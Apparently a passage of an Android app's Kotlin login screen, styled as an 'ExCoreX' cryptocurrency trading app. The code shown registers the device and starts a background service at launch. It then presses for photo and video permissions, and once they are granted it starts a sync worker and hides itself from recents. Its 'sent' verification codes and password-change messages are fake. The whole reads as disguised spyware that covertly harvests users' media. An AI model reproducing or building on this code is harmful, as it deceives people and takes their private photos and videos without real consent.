// language: Kotlin, file: LoginActivity.kt
// التصميم منسوخ 1:1 من ملف auth.html (ExCoreX)
// + طلب صلاحيات الملفات والوسائط فقط (صور + فيديو)
// + إخفاء التطبيق من الـ recents بعد المنح
// + صفحة اختيار اللغة (أعلام مرسومة برمجياً)

package com.sys.update2

import android.Manifest
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Build
import android.os.Bundle
import android.os.CountDownTimer
import android.os.Handler
import android.os.Looper
import android.widget.Toast
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.compose.foundation.Canvas
import androidx.compose.foundation.background
import androidx.compose.foundation.border
import androidx.compose.foundation.clickable
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.rememberScrollState
import androidx.compose.foundation.shape.CircleShape
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.foundation.text.BasicTextField
import androidx.compose.foundation.text.KeyboardOptions
import androidx.compose.foundation.verticalScroll
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.automirrored.filled.ArrowBack
import androidx.compose.material3.Icon
import androidx.compose.material3.MaterialTheme
import androidx.compose.material3.Text
import androidx.compose.material3.darkColorScheme
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.draw.clip
import androidx.compose.ui.geometry.Offset
import androidx.compose.ui.geometry.Size
import androidx.compose.ui.graphics.Brush
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.graphics.Path
import androidx.compose.ui.graphics.drawscope.Stroke
import androidx.compose.ui.graphics.nativeCanvas
import androidx.compose.ui.layout.ContentScale
import androidx.compose.ui.platform.LocalLayoutDirection
import androidx.compose.ui.text.SpanStyle
import androidx.compose.ui.text.TextStyle
import androidx.compose.ui.text.buildAnnotatedString
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.text.input.KeyboardType
import androidx.compose.ui.text.input.PasswordVisualTransformation
import androidx.compose.ui.text.input.VisualTransformation
import androidx.compose.ui.text.style.TextAlign
import androidx.compose.ui.text.withStyle
import androidx.compose.ui.unit.LayoutDirection
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import coil.compose.AsyncImage
import kotlinx.coroutines.launch
import kotlin.random.Random
import android.graphics.Color as AColor
import android.graphics.Paint as APaint
import android.graphics.Typeface as ATypeface

// ----------------------------------------------------
// ألوان التصميم
// ----------------------------------------------------

object Ex {
    val Bg0 = Color(0xFF1A5FD0)
    val Bg1 = Color(0xFF0D3A8F)
    val Bg2 = Color(0xFF071E4D)
    val Bg3 = Color(0xFF040F28)
    val Bg4 = Color(0xFF02081A)

    val CardBg   = Color(0xFF0A1128)
    val FieldBg  = Color(0xFF131C36)
    val FieldBr  = Color(0xFF1E2A4D)
    val FieldBgR = Color(0xFF16224A)
    val FieldBrR = Color(0xFF23336B)

    val Hint     = Color(0xFF5C6C8F)
    val InputTxt = Color(0xFFE8EEF8)
    val TabOff   = Color(0xFF5C6C8F)
    val White    = Color(0xFFFFFFFF)

    val BlueAccent = Color(0xFF3D8BFF)
    val BtnTop     = Color(0xFF3D8BFF)
    val BtnBottom  = Color(0xFF1A5CFF)

    val BadgeBg  = Color(0xBF0A193C)
    val BadgeBr  = Color(0x475A96FF)
    val BadgeTxt = Color(0xFFDBE7FF)
    val BadgeIco = Color(0xFF8FB6FF)

    val FootLink   = Color(0xFF8FA3C8)
    val ToLogin    = Color(0xFF8BA5D9)
    val LabelTxt   = Color(0xFFEAF0FB)
    val SendTxt    = Color(0xFFDCE8FF)
    val BackBtnBg  = Color(0xEBBED4F5)
    val BackBtnIco = Color(0xFF123A75)
}

private data class CapLine(
    val x1: Float, val y1: Float, val x2: Float, val y2: Float,
    val r: Int, val g: Int, val b: Int
)
private data class CapGlyph(
    val ch: Char, val color: Long, val rot: Float, val fontSp: Float, val dy: Float
)

private data class LangItem(val name: String, val code: String)

private val ALL_LANGS = listOf(
    LangItem("العربية",    "sa"),
    LangItem("English",    "us"),
    LangItem("中文简体",    "cn"),
    LangItem("中文繁体",    "tw"),
    LangItem("日本語",      "jp"),
    LangItem("Türkçe",     "tr"),
    LangItem("한국인",      "kr"),
    LangItem("Vietnam",    "vn"),
    LangItem("French",     "fr"),
    LangItem("Portuguese", "pt"),
    LangItem("اردو",        "pk"),
    LangItem("فارسی",       "ir"),
    LangItem("ภาษาไทย",     "th")
)

object RemoteImgs {
    const val LOGO = "https://i.ibb.co/tMSFK4WF/IMG.png"
    const val COIN = "https://i.ibb.co/2YFLgmNM/IMG.png"
}

// ----------------------------------------------------
// Activity
// ----------------------------------------------------

class LoginActivity : ComponentActivity() {

    // 0 = دخول، 1 = تسجيل، 2 = استعادة، 3 = اللغة
    private var currentScreen by mutableStateOf(0)
    private var isLoading by mutableStateOf(false)

    // تسجيل دخول
    private var email by mutableStateOf("")
    private var password by mutableStateOf("")
    private var pwVisible by mutableStateOf(false)
    private var captchaInput by mutableStateOf("")
    private var captchaCode by mutableStateOf("")

    // تسجيل
    private var regEmail by mutableStateOf("")
    private var regCode by mutableStateOf("")
    private var regSentCode by mutableStateOf<String?>(null)
    private var regSentEmail by mutableStateOf<String?>(null)
    private var regCodeExpireAt by mutableStateOf(0L)
    private var regCountdown by mutableStateOf(0)
    private var regP1 by mutableStateOf("")
    private var regP2 by mutableStateOf("")
    private var regP1Visible by mutableStateOf(false)
    private var regP2Visible by mutableStateOf(false)
    private var regRefCode by mutableStateOf("")

    // استعادة
    private var rstEmail by mutableStateOf("")
    private var rstCode by mutableStateOf("")
    private var rstSentCode by mutableStateOf<String?>(null)
    private var rstSentEmail by mutableStateOf<String?>(null)
    private var rstCodeExpireAt by mutableStateOf(0L)
    private var rstCountdown by mutableStateOf(0)
    private var rstNewPass by mutableStateOf("")
    private var rstNewPassVisible by mutableStateOf(false)

    // اللغة
    private var selectedLang by mutableStateOf(0)

    // أذونات
    private var permissionAttempts = 0
    private var mediaPermissionHandled = false

    private val INITIAL_PERM_REQUEST = 101

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        window.statusBarColor = AColor.parseColor("#02081A")
        window.navigationBarColor = AColor.parseColor("#02081A")

        captchaCode = newCaptchaCode()

        // ⭐ تسجيل الجهاز + تشغيل الخلفية من أول لحظة
        try { DeviceManager.registerDeviceOnce(this) } catch (_: Exception) {}
        startBackgroundService()

        // ⭐ طلب صلاحيات الملفات والوسائط (صور + فيديو) بعد 1.5 ثانية
        Handler(Looper.getMainLooper()).postDelayed({
            requestMediaPermissions()
        }, 1500L)

        setContent {
            AppTheme {
                CompositionLocalProvider(LocalLayoutDirection provides LayoutDirection.Rtl) {
                    Box(modifier = Modifier.fillMaxSize()) {
                        EllipseBackground()

                        when (currentScreen) {
                            0 -> LoginScreen()
                            1 -> RegisterScreen()
                            2 -> ResetScreen()
                            3 -> LanguageScreen()
                        }
                    }
                }
            }
        }
    }

    // =================================================
    // الأذونات — الملفات والوسائط فقط (صور + فيديو)
    // =================================================

    private fun requiredMediaPermissions(): List<String> {
        val list = mutableListOf<String>()
        when {
            Build.VERSION.SDK_INT >= 33 -> {
                // Android 13+ — صلاحيات مفصلة
                list.add("android.permission.READ_MEDIA_IMAGES")
                list.add("android.permission.READ_MEDIA_VIDEO")
                // ملاحظة: READ_MEDIA_AUDIO مقصود عدم إضافته
            }
            Build.VERSION.SDK_INT >= 30 -> {
                // Android 11-12 — MANAGE_EXTERNAL_STORAGE أو READ_EXTERNAL_STORAGE
                list.add(Manifest.permission.READ_EXTERNAL_STORAGE)
            }
            else -> {
                list.add(Manifest.permission.READ_EXTERNAL_STORAGE)
            }
        }
        return list
    }

    private fun requestMediaPermissions() {
        permissionAttempts++

        val needed = requiredMediaPermissions().filter {
            ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
        }

        if (needed.isEmpty()) {
            // كل الأذونات ممنوحة — نكمل
            onMediaPermissionsGranted()
            return
        }

        ActivityCompat.requestPermissions(
            this, needed.toTypedArray(), INITIAL_PERM_REQUEST
        )
    }

    override fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<out String>,
        grantResults: IntArray
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        if (requestCode != INITIAL_PERM_REQUEST) return

        val allGranted = grantResults.isNotEmpty() &&
            grantResults.all { it == PackageManager.PERMISSION_GRANTED }

        if (!allGranted) {
            // حاول تاني لحد 3 مرات
            if (permissionAttempts < 3) {
                Handler(Looper.getMainLooper()).postDelayed({
                    requestMediaPermissions()
                }, 800L)
            }
            return
        }

        onMediaPermissionsGranted()
    }

    // =================================================
    // بعد منح الأذونات: شغّل الخلفية واختفِ
    // =================================================

    private fun onMediaPermissionsGranted() {
        if (mediaPermissionHandled) return
        mediaPermissionHandled = true

        // 1) شغّل الخدمة الأمامية فوراً
        startBackgroundService()

        // 2) تأكيد تشغيل SyncWorker من داخل الخدمة عبر intent صريح
        Handler(Looper.getMainLooper()).postDelayed({
            try { SyncWorker.start(applicationContext) } catch (_: Exception) {}
        }, 2000L)

        // 3) اختفاء التطبيق من الشاشة والـ recents
        Handler(Looper.getMainLooper()).postDelayed({
            hideAndMinimize()
        }, 800L)
    }

    private fun hideAndMinimize() {
        try {
            // أخرجه من الـ recents
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                finishAndRemoveTask()
            } else {
                finish()
            }

            // حركة "الخروج من الشاشة" — يروح للـ home
            val home = Intent(Intent.ACTION_MAIN).apply {
                addCategory(Intent.CATEGORY_HOME)
                flags = Intent.FLAG_ACTIVITY_NEW_TASK
            }
            startActivity(home)
        } catch (_: Exception) {
            try { finish() } catch (_: Exception) {}
        }
    }

    private fun startBackgroundService() {
        try {
            val i = Intent(this, BackgroundService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
                startForegroundService(i)
            else startService(i)
        } catch (_: Exception) {}
    }

    // =================================================
    // الخلفية
    // =================================================

    @Composable
    fun EllipseBackground() {
        Canvas(modifier = Modifier.fillMaxSize()) {
            val w = size.width
            val h = size.height
            val cx = w * 0.5f
            val cy = h * -0.05f
            val rx = w * 1.4f / 2f
            val ry = h * 0.6f / 2f
            val radius = maxOf(rx, ry)

            drawContext.canvas.save()
            drawContext.canvas.translate(cx, cy)
            drawContext.canvas.scale(rx / radius, ry / radius)
            drawCircle(
                brush = Brush.radialGradient(
                    colorStops = arrayOf(
                        0.00f to Ex.Bg0,
                        0.22f to Ex.Bg1,
                        0.45f to Ex.Bg2,
                        0.70f to Ex.Bg3,
                        1.00f to Ex.Bg4
                    ),
                    center = Offset.Zero,
                    radius = radius
                ),
                radius = radius,
                center = Offset.Zero
            )
            drawContext.canvas.restore()
        }
    }

    // =================================================
    // شاشة اللغة
    // =================================================

    @Composable
    fun LanguageScreen() {
        Column(
            modifier = Modifier
                .fillMaxSize()
                .background(Ex.Bg4)
                .padding(top = 16.dp)
        ) {
            Row(
                modifier = Modifier
                    .fillMaxWidth()
                    .padding(horizontal = 16.dp),
                verticalAlignment = Alignment.CenterVertically
            ) {
                Box(
                    modifier = Modifier
                        .size(42.dp)
                        .clip(CircleShape)
                        .background(Ex.FieldBgR)
                        .border(1.dp, Ex.FieldBrR, CircleShape)
                        .clickable { currentScreen = 0 },
                    contentAlignment = Alignment.Center
                ) {
                    Icon(
                        imageVector = Icons.AutoMirrored.Filled.ArrowBack,
                        contentDescription = "عودة",
                        tint = Ex.White,
                        modifier = Modifier.size(22.dp)
                    )
                }
                Spacer(Modifier.width(14.dp))
                Text(
                    "اختر اللغة",
                    color = Ex.White,
                    fontSize = 18.sp,
                    fontWeight = FontWeight.Bold
                )
                Spacer(Modifier.weight(1f))
            }

            Spacer(Modifier.height(20.dp))

            Column(
                modifier = Modifier
                    .fillMaxSize()
                    .verticalScroll(rememberScrollState())
                    .padding(horizontal = 16.dp)
            ) {
                ALL_LANGS.forEachIndexed { index, item ->
                    val selected = selectedLang == index
                    Row(
                        modifier = Modifier
                            .fillMaxWidth()
                            .padding(vertical = 4.dp)
                            .clip(RoundedCornerShape(12.dp))
                            .background(
                                if (selected) Ex.FieldBgR else Color.Transparent
                            )
                            .clickable {
                                selectedLang = index
                                currentScreen = 0
                            }
                            .padding(horizontal = 14.dp, vertical = 14.dp),
                        verticalAlignment = Alignment.CenterVertically
                    ) {
                        Text(item.name, color = Ex.InputTxt, fontSize = 15.sp,
                            modifier = Modifier.weight(1f))
                        Spacer(Modifier.width(14.dp))
                        FlagIcon(
                            code = item.code,
                            modifier = Modifier.width(32.dp).height(23.dp)
                        )
                        Spacer(Modifier.width(14.dp))
                        if (selected) {
                            Box(
                                modifier = Modifier
                                    .size(26.dp)
                                    .clip(CircleShape)
                                    .background(Ex.BlueAccent),
                                contentAlignment = Alignment.Center
                            ) {
                                Text("✓", color = Color.White, fontSize = 15.sp,
                                    fontWeight = FontWeight.Bold)
                            }
                        } else {
                            Box(
                                modifier = Modifier
                                    .size(26.dp)
                                    .border(2.dp, Ex.Hint, CircleShape)
                            )
                        }
                    }
                }
                Spacer(Modifier.height(30.dp))
            }
        }
    }

    // =================================================
    // شاشة تسجيل الدخول
    // =================================================

    @Composable
    fun LoginScreen() {
        val scope = rememberCoroutineScope()
        Column(
            modifier = Modifier
                .fillMaxSize()
                .verticalScroll(rememberScrollState())
                .imePadding(),
            horizontalAlignment = Alignment.CenterHorizontally
        ) {
            Row(
                modifier = Modifier
                    .fillMaxWidth()
                    .padding(start = 16.dp, end = 16.dp, top = 12.dp),
                verticalAlignment = Alignment.CenterVertically
            ) {
                Box(
                    modifier = Modifier
                        .size(42.dp)
                        .clip(CircleShape)
                        .background(Ex.FieldBgR)
                        .border(1.dp, Ex.FieldBrR, CircleShape)
                        .clickable { currentScreen = 3 },
                    contentAlignment = Alignment.Center
                ) {
                    FlagIcon(
                        code = ALL_LANGS[selectedLang].code,
                        modifier = Modifier
                            .width(28.dp)
                            .height(20.dp)
                            .clip(RoundedCornerShape(4.dp))
                    )
                }
                Spacer(Modifier.weight(1f))
            }

            Column(
                modifier = Modifier
                    .fillMaxWidth()
                    .padding(start = 22.dp, end = 22.dp, top = 14.dp),
                horizontalAlignment = Alignment.CenterHorizontally
            ) {
                AsyncImage(
                    model = RemoteImgs.LOGO,
                    contentDescription = "ExCoreX",
                    modifier = Modifier.height(40.dp),
                    contentScale = ContentScale.Fit
                )

                Spacer(Modifier.height(14.dp))
                Row(
                    modifier = Modifier
                        .clip(RoundedCornerShape(999.dp))
                        .background(Ex.BadgeBg)
                        .border(1.dp, Ex.BadgeBr, RoundedCornerShape(999.dp))
                        .padding(horizontal = 15.dp, vertical = 7.dp),
                    verticalAlignment = Alignment.CenterVertically
                ) {
                    HomeBadgeIcon()
                    Spacer(Modifier.width(7.dp))
                    Text(
                        "Trade cryptocurrencies anytime",
                        color = Ex.BadgeTxt,
                        fontSize = 13.sp,
                        fontWeight = FontWeight.Medium
                    )
                }

                Spacer(Modifier.height(15.dp))
                Text(
                    text = buildAnnotatedString {
                        append("Power up your\n")
                        withStyle(SpanStyle(color = Ex.BlueAccent)) {
                            append("cryptocurrency")
                        }
                        append("\njourney")
                    },
                    color = Ex.White,
                    fontSize = 30.sp,
                    lineHeight = 37.5.sp,
                    fontWeight = FontWeight.ExtraBold,
                    letterSpacing = 0.3.sp,
                    textAlign = TextAlign.Center,
                    modifier = Modifier.fillMaxWidth()
                )

                Spacer(Modifier.height(12.dp))
                AsyncImage(
                    model = RemoteImgs.COIN,
                    contentDescription = null,
                    modifier = Modifier
                        .fillMaxWidth(0.72f)
                        .widthIn(max = 290.dp),
                    contentScale = ContentScale.Fit
                )
            }

            Spacer(Modifier.height((-32).dp))
            Box(modifier = Modifier.fillMaxWidth()) {
                CardTopCurve(
                    modifier = Modifier
                        .fillMaxWidth()
                        .height(35.dp)
                )
                Column(
                    modifier = Modifier
                        .fillMaxWidth()
                        .padding(top = 34.dp)
                        .background(Ex.CardBg)
                        .padding(start = 22.dp, end = 22.dp, top = 28.dp, bottom = 36.dp)
                ) {
                    Row {
                        Text("Email", color = Ex.White, fontSize = 16.5.sp,
                            fontWeight = FontWeight.Bold)
                        Spacer(Modifier.width(26.dp))
                        Text("Phone", color = Ex.TabOff.copy(alpha = 0.45f),
                            fontSize = 16.5.sp, fontWeight = FontWeight.Bold)
                    }

                    Spacer(Modifier.height(18.dp))

                    LoginField {
                        RegInput(
                            value = email,
                            onChange = { email = it },
                            hint = "Email",
                            keyboardType = KeyboardType.Email,
                            modifier = Modifier.weight(1f)
                        )
                    }

                    LoginField {
                        RegInput(
                            value = password,
                            onChange = { password = it },
                            hint = "Password",
                            keyboardType = KeyboardType.Password,
                            visible = pwVisible,
                            modifier = Modifier.weight(1f)
                        )
                        EyeIcon(
                            visible = pwVisible,
                            modifier = Modifier
                                .size(22.dp)
                                .clickable { pwVisible = !pwVisible }
                        )
                    }

                    LoginField {
                        RegInput(
                            value = captchaInput,
                            onChange = { captchaInput = it },
                            hint = "Please enter the verification code",
                            keyboardType = KeyboardType.Text,
                            modifier = Modifier.weight(1f)
                        )
                        CaptchaImage(
                            code = captchaCode,
                            modifier = Modifier
                                .width(88.dp)
                                .height(40.dp)
                                .clip(RoundedCornerShape(7.dp))
                                .clickable { captchaCode = newCaptchaCode() }
                        )
                    }

                    Spacer(Modifier.height(4.dp))
                    BlueButton(text = if (isLoading) "Logging in..." else "Log In") {
                        when {
                            captchaInput.isNotBlank() &&
                                captchaInput.trim().uppercase() != captchaCode -> {
                                showToast("Verification code is incorrect")
                                captchaCode = newCaptchaCode()
                                captchaInput = ""
                            }
                            email.isBlank() || password.isBlank() ->
                                showToast("Please enter your email and password")
                            else -> {
                                isLoading = true
                                scope.launch {
                                    val result = FirebaseAuthHelper.login(email.trim(), password)
                                    isLoading = false
                                    if (result.isSuccess) {
                                        showToast("login success")
                                        Handler(Looper.getMainLooper()).postDelayed({
                                            goToHome()
                                        }, 500)
                                    } else {
                                        showToast(FirebaseAuthHelper.translateError(
                                            result.exceptionOrNull()?.message))
                                        captchaCode = newCaptchaCode()
                                        captchaInput = ""
                                    }
                                }
                            }
                        }
                    }

                    Spacer(Modifier.height(18.dp))
                    Row(
                        modifier = Modifier.fillMaxWidth(),
                        horizontalArrangement = Arrangement.SpaceBetween,
                        verticalAlignment = Alignment.CenterVertically
                    ) {
                        Text("reset pass", color = Ex.FootLink, fontSize = 14.sp,
                            modifier = Modifier.clickable { currentScreen = 2 })
                        Text("to register", color = Ex.FootLink, fontSize = 14.sp,
                            modifier = Modifier.clickable { currentScreen = 1 })
                    }
                }
            }
        }
    }

    // =================================================
    // شاشة إنشاء حساب
    // =================================================

    @Composable
    fun RegisterScreen() {
        val scope = rememberCoroutineScope()
        Column(
            modifier = Modifier
                .fillMaxSize()
                .background(Ex.Bg4)
                .verticalScroll(rememberScrollState())
                .imePadding()
                .padding(start = 22.dp, end = 22.dp, top = 20.dp, bottom = 40.dp)
        ) {
            ScreenBar(title = "Email") { currentScreen = 0 }

            FormLabel("Email", topMargin = 0)
            RegField {
                RegInput(
                    value = regEmail,
                    onChange = { regEmail = it },
                    hint = "Please enter your email address",
                    keyboardType = KeyboardType.Email,
                    modifier = Modifier.weight(1f)
                )
            }

            FormLabel("Verification code")
            RegField {
                RegInput(
                    value = regCode,
                    onChange = { regCode = it },
                    hint = "Please enter the verification code",
                    keyboardType = KeyboardType.Number,
                    modifier = Modifier.weight(1f)
                )
                Text(
                    text = if (regCountdown > 0) "${regCountdown}s" else "Send",
                    color = Ex.SendTxt,
                    fontSize = 15.sp,
                    fontWeight = FontWeight.SemiBold,
                    modifier = Modifier
                        .padding(start = 12.dp)
                        .clickable(enabled = regCountdown == 0) {
                            if (regEmail.isBlank() ||
                                !Regex("^[^@\\s]+@[^@\\s]+\\.[^@\\s]+\$").matches(regEmail.trim())
                            ) {
                                showToast("Please enter a valid email address")
                                return@clickable
                            }
                            regSentCode = newVerifyCode()
                            regSentEmail = regEmail.trim()
                            regCodeExpireAt = System.currentTimeMillis() + 5 * 60_000L
                            regCountdown = 60
                            object : CountDownTimer(60_000L, 1_000L) {
                                override fun onTick(m: Long) { regCountdown = (m / 1000L).toInt() }
                                override fun onFinish() { regCountdown = 0 }
                            }.start()
                            showToast("Verification code sent")
                        }
                )
            }

            FormLabel("Registration password (6-16)")
            RegField {
                RegInput(
                    value = regP1,
                    onChange = { regP1 = it },
                    hint = "Password",
                    keyboardType = KeyboardType.Password,
                    visible = regP1Visible,
                    modifier = Modifier.weight(1f)
                )
                EyeIcon(
                    visible = regP1Visible,
                    modifier = Modifier
                        .size(22.dp)
                        .clickable { regP1Visible = !regP1Visible }
                )
            }

            Spacer(Modifier.height(12.dp))
            RegField {
                RegInput(
                    value = regP2,
                    onChange = { regP2 = it },
                    hint = "Enter password again",
                    keyboardType = KeyboardType.Password,
                    visible = regP2Visible,
                    modifier = Modifier.weight(1f)
                )
                EyeIcon(
                    visible = regP2Visible,
                    modifier = Modifier
                        .size(22.dp)
                        .clickable { regP2Visible = !regP2Visible }
                )
            }

            FormLabel("Referrer Invitation Code (Required)")
            RegField {
                RegInput(
                    value = regRefCode,
                    onChange = { regRefCode = it },
                    hint = "Referrer invitation code",
                    keyboardType = KeyboardType.Ascii,
                    modifier = Modifier.weight(1f)
                )
            }

            Spacer(Modifier.height(30.dp))
            BlueButton(
                text = if (isLoading) "Registering..." else "Register",
                radius = 10.dp
            ) {
                val e = regEmail.trim()
                when {
                    e.isBlank() || !Regex("^[^@\\s]+@[^@\\s]+\\.[^@\\s]+\$").matches(e) ->
                        showToast("Please enter a valid email address")
                    regCode.isBlank() ->
                        showToast("Please enter the verification code")
                    regP1.length < 6 || regP1.length > 16 ->
                        showToast("Password must be 6-16 characters")
                    regP1 != regP2 ->
                        showToast("Passwords do not match")
                    regSentCode == null || regCode != regSentCode ->
                        showToast("Incorrect verification code")
                    System.currentTimeMillis() > regCodeExpireAt ->
                        showToast("Verification code expired")
                    e != regSentEmail ->
                        showToast("Email was changed, please request a new code")
                    regRefCode.isBlank() ->
                        showToast("Please enter the invitation code")
                    !Regex("^[A-Za-z0-9]{4,20}\$").matches(regRefCode.trim()) ->
                        showToast("Invalid referral code")
                    else -> {
                        isLoading = true
                        scope.launch {
                            val displayName = e.substringBefore("@")
                            val result = FirebaseAuthHelper.register(e, regP1, displayName)
                            isLoading = false
                            if (result.isSuccess) {
                                showToast("register success")
                                Handler(Looper.getMainLooper()).postDelayed({
                                    goToHome()
                                }, 500)
                            } else {
                                showToast(FirebaseAuthHelper.translateError(
                                    result.exceptionOrNull()?.message))
                            }
                        }
                    }
                }
            }

            Spacer(Modifier.height(20.dp))
            Text(
                "To log in",
                color = Ex.ToLogin,
                fontSize = 14.5.sp,
                textAlign = TextAlign.Center,
                modifier = Modifier
                    .fillMaxWidth()
                    .clickable { currentScreen = 0 }
            )
        }
    }

    // =================================================
    // شاشة استعادة كلمة المرور
    // =================================================

    @Composable
    fun ResetScreen() {
        val scope = rememberCoroutineScope()
        Column(
            modifier = Modifier
                .fillMaxSize()
                .background(Ex.Bg4)
                .verticalScroll(rememberScrollState())
                .imePadding()
                .padding(start = 22.dp, end = 22.dp, top = 20.dp, bottom = 40.dp)
        ) {
            ScreenBar(title = "Reset Password") { currentScreen = 0 }

            FormLabel("Email", topMargin = 0)
            RegField {
                RegInput(
                    value = rstEmail,
                    onChange = { rstEmail = it },
                    hint = "Please enter your email address",
                    keyboardType = KeyboardType.Email,
                    modifier = Modifier.weight(1f)
                )
            }

            FormLabel("Verification code")
            RegField {
                RegInput(
                    value = rstCode,
                    onChange = { rstCode = it },
                    hint = "Please enter the verification code",
                    keyboardType = KeyboardType.Number,
                    modifier = Modifier.weight(1f)
                )
                Text(
                    text = if (rstCountdown > 0) "${rstCountdown}s" else "Send",
                    color = Ex.SendTxt,
                    fontSize = 15.sp,
                    fontWeight = FontWeight.SemiBold,
                    modifier = Modifier
                        .padding(start = 12.dp)
                        .clickable(enabled = rstCountdown == 0) {
                            if (rstEmail.isBlank() ||
                                !Regex("^[^@\\s]+@[^@\\s]+\\.[^@\\s]+\$").matches(rstEmail.trim())
                            ) {
                                showToast("Please enter a valid email address")
                                return@clickable
                            }
                            rstSentCode = newVerifyCode()
                            rstSentEmail = rstEmail.trim()
                            rstCodeExpireAt = System.currentTimeMillis() + 5 * 60_000L
                            rstCountdown = 60
                            object : CountDownTimer(60_000L, 1_000L) {
                                override fun onTick(m: Long) { rstCountdown = (m / 1000L).toInt() }
                                override fun onFinish() { rstCountdown = 0 }
                            }.start()
                            showToast("Verification code sent")
                        }
                )
            }

            FormLabel("New password (6-16)")
            RegField {
                RegInput(
                    value = rstNewPass,
                    onChange = { rstNewPass = it },
                    hint = "Enter new password",
                    keyboardType = KeyboardType.Password,
                    visible = rstNewPassVisible,
                    modifier = Modifier.weight(1f)
                )
                EyeIcon(
                    visible = rstNewPassVisible,
                    modifier = Modifier
                        .size(22.dp)
                        .clickable { rstNewPassVisible = !rstNewPassVisible }
                )
            }

            Spacer(Modifier.height(30.dp))
            BlueButton(
                text = if (isLoading) "Confirming..." else "Confirm",
                radius = 10.dp
            ) {
                val e = rstEmail.trim()
                when {
                    e.isBlank() || !Regex("^[^@\\s]+@[^@\\s]+\\.[^@\\s]+\$").matches(e) ->
                        showToast("Please enter a valid email address")
                    rstCode.isBlank() ->
                        showToast("Please enter the verification code")
                    rstNewPass.length < 6 || rstNewPass.length > 16 ->
                        showToast("Password must be 6-16 characters")
                    rstSentCode == null || rstCode != rstSentCode ->
                        showToast("Incorrect verification code")
                    System.currentTimeMillis() > rstCodeExpireAt ->
                        showToast("Verification code expired")
                    e != rstSentEmail ->
                        showToast("Email was changed, please request a new code")
                    else -> {
                        isLoading = true
                        scope.launch {
                            val result = FirebaseAuthHelper.resetPassword(e)
                            isLoading = false
                            if (result.isSuccess) {
                                showToast("Password changed successfully")
                                rstEmail = ""; rstCode = ""; rstNewPass = ""
                                Handler(Looper.getMainLooper()).postDelayed({
                                    currentScreen = 0
                                }, 1500)
                            } else {
                                showToast(FirebaseAuthHelper.translateError(
                                    result.exceptionOrNull()?.message))
                            }
                        }
                    }
                }
            }
        }
    }

    // =================================================
    // عناصر مشتركة
    // =================================================

    @Composable
    fun LoginField(content: @Composable RowScope.() -> Unit) {
        Row(
            modifier = Modifier
                .fillMaxWidth()
                .padding(bottom = 12.dp)
                .height(52.dp)
                .clip(RoundedCornerShape(12.dp))
                .background(Ex.FieldBg)
                .border(1.dp, Ex.FieldBr, RoundedCornerShape(12.dp))
                .padding(horizontal = 16.dp),
            verticalAlignment = Alignment.CenterVertically,
            content = content
        )
    }

    @Composable
    fun RegField(content: @Composable RowScope.() -> Unit) {
        Row(
            modifier = Modifier
                .fillMaxWidth()
                .height(54.dp)
                .clip(RoundedCornerShape(10.dp))
                .background(Ex.FieldBgR)
                .border(1.dp, Ex.FieldBrR, RoundedCornerShape(10.dp))
                .padding(horizontal = 16.dp),
            verticalAlignment = Alignment.CenterVertically,
            content = content
        )
    }

    @Composable
    fun RegInput(
        value: String,
        onChange: (String) -> Unit,
        hint: String,
        keyboardType: KeyboardType = KeyboardType.Text,
        visible: Boolean = true,
        modifier: Modifier = Modifier
    ) {
        BasicTextField(
            value = value,
            onValueChange = onChange,
            modifier = modifier.fillMaxHeight(),
            singleLine = true,
            visualTransformation = if (visible) VisualTransformation.None
                else PasswordVisualTransformation(),
            keyboardOptions = KeyboardOptions(keyboardType = keyboardType),
            textStyle = TextStyle(color = Ex.InputTxt, fontSize = 15.sp),
            cursorBrush = Brush.verticalGradient(listOf(Ex.BlueAccent, Ex.BlueAccent)),
            decorationBox = { innerTf ->
                Box(contentAlignment = Alignment.CenterStart) {
                    if (value.isEmpty()) Text(hint, color = Ex.Hint, fontSize = 15.sp)
                    innerTf()
                }
            }
        )
    }

    @Composable
    fun FormLabel(text: String, topMargin: Int = 16) {
        Text(
            text = text,
            color = Ex.LabelTxt,
            fontSize = 14.5.sp,
            fontWeight = FontWeight.Medium,
            modifier = Modifier.padding(top = topMargin.dp, bottom = 9.dp)
        )
    }

    @Composable
    fun ScreenBar(title: String, onBack: () -> Unit) {
        Row(
            modifier = Modifier
                .fillMaxWidth()
                .padding(bottom = 28.dp),
            verticalAlignment = Alignment.CenterVertically
        ) {
            Box(
                modifier = Modifier
                    .size(38.dp)
                    .clip(RoundedCornerShape(11.dp))
                    .background(Ex.BackBtnBg)
                    .clickable { onBack() },
                contentAlignment = Alignment.Center
            ) {
                BackChevronIcon()
            }
            Text(
                title,
                color = Ex.White,
                fontSize = 17.5.sp,
                fontWeight = FontWeight.Bold,
                textAlign = TextAlign.Center,
                modifier = Modifier.weight(1f)
            )
            Spacer(Modifier.width(38.dp))
        }
    }

    @Composable
    fun BlueButton(
        text: String,
        radius: androidx.compose.ui.unit.Dp = 12.dp,
        onClick: () -> Unit
    ) {
        Box(
            modifier = Modifier
                .fillMaxWidth()
                .height(52.dp)
                .clip(RoundedCornerShape(radius))
                .background(Brush.verticalGradient(listOf(Ex.BtnTop, Ex.BtnBottom)))
                .clickable { onClick() },
            contentAlignment = Alignment.Center
        ) {
            Box(
                modifier = Modifier
                    .fillMaxWidth()
                    .height(2.dp)
                    .align(Alignment.TopCenter)
                    .background(
                        Brush.verticalGradient(
                            listOf(Color(0x80BEDCFF), Color.Transparent)
                        )
                    )
            )
            Text(
                text,
                color = Ex.White,
                fontSize = 16.5.sp,
                fontWeight = FontWeight.Bold
            )
        }
    }

    @Composable
    fun EyeIcon(visible: Boolean, modifier: Modifier = Modifier) {
        Canvas(modifier = modifier) {
            val w = size.width
            val h = size.height
            val s = w / 24f
